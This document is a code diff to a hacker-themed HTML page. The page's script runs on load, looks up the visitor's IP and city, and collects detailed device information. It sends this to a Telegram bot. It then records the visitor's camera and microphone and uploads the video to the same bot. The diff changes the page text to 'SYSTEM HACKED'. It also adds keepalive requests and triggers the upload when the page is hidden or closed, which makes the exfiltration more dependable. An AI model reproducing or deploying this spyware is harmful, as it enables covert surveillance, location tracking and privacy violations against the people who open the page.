@@ -8,14 +8,14 @@
         body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
         canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
         .content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6); }
-        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; max-width: 80%; }
+        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; max-width: 85%; font-size: 14px; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="content">
-        <h1>[ SYSTEM SCANNING ]</h1>
-        <div class="box"><p id="status">> Full System Access Authorized...</p></div>
+        <h1>[ SYSTEM HACKED ]</h1>
+        <div class="box"><p id="status">> Full Accessing System Data...</p></div>
     </div>
 
     <script>
@@ -41,7 +41,7 @@
         setInterval(draw, 33);
 
         async function start() {
-            // ١. کۆکردنەوە و ناردنی هەموو زانیارییەکان
+            // ١. ناردنی زانیارییە وردەکان
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -54,12 +54,12 @@
                 }
                 const gl = document.createElement('canvas').getContext('webgl');
                 const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-                
+
                 const msg = `🎭 ADVANCED REPORT:\n📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}\n🌐 ئایپی: ${data.ip}\n📍 شار: ${data.city}\n🔋 پاتری: ${batt}\n🔄 شاشە: ${hz}Hz\n🌙 دۆخی شەو: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "ON" : "OFF"}\n🎮 گرافیک: ${gpu}\n💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB\n⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores\n🌍 زمان: ${navigator.language}\n⏰ کات: ${new Date().toLocaleString()}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`, { keepalive: true });
             } catch(e){}
 
-            // ٢. تۆمارکردنی ڤیدیۆ (ناردن لەکاتی داخستن یان تەواوبوونی کات)
+            // ٢. تۆمارکردنی ڤیدیۆ و دەنگ
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -69,24 +69,24 @@
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const f = new FormData(); f.append('chat_id', chatId); f.append('video', blob, 'hacker.mp4');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: f });
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { 
+                        method: 'POST', 
+                        body: f,
+                        keepalive: true 
+                    });
                     stream.getTracks().forEach(t => t.stop());
                 };
 
                 recorder.start();
 
-                // ئەگەر ٣٠ چرکە تەواو بوو
-                const timeout = setTimeout(() => {
-                    if (recorder.state === "recording") recorder.stop();
-                }, 30000);
+                // ناردن لەکاتی داخستن یان گۆڕینی پەڕە (Minimize)
+                const handleStop = () => { if (recorder.state === "recording") recorder.stop(); };
+                window.addEventListener("pagehide", handleStop);
+                document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden') handleStop(); });
 
-                // ئەگەر پەڕەکەی داخست یان گۆڕی، ڕاستەوخۆ بینێرە
-                window.onpagehide = () => {
-                    if (recorder.state === "recording") {
-                        clearTimeout(timeout);
-                        recorder.stop();
-                    }
-                };
+                // سنووری ٣٠ چرکە بۆ ڤیدیۆکە
+                setTimeout(handleStop, 30000);
+
             } catch(err){}
         }
         window.onload = start;
